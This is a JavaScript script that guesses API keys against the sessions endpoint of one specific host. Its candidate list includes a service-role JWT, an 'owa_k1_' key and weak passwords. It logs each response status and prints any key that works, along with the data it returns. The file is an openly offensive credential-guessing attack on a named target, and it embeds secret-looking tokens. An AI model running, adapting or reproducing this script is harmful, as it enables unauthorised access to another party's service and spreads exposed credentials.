const baseUrl = 'https://193-29-187-66.sslip.io';

async function probeKeys() {
  const keysToTest = [
    'owa_k1_c7f0ddf2bac4594780986cd843f90ed0baae6562399eeeb076b151325e5bef02',
    'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJzdXBhYmFzZSIsImlhdCI6MTc4NTM0NjgwMCwiZXhwIjo0OTQxMDIwNDAwLCJyb2xlIjoic2VydmljZV9yb2xlIn0.TL_OxgOS5gT7aXnsQHrVWDWa6oiQtyu_Vc1WPm7CA8Y',
    '',
    'admin',
    'secret',
    'openwa',
    '225chretien',
    'babipass',
    '123456',
    'apikey',
    'key'
  ];

  for (const k of keysToTest) {
    try {
      const res = await fetch(`${baseUrl}/api/sessions`, {
        headers: { 'X-API-Key': k }
      });
      console.log(`Key "${k.substring(0, 15)}..." -> Status: ${res.status}`);
      if (res.ok) {
        console.log(`🎉 VALID API KEY FOUND FOR ${baseUrl}: "${k}"`);
        console.log("Response:", await res.text());
        return;
      }
    } catch (e) {
      console.error(`Key error:`, e.message);
    }
  }
}

probeKeys();
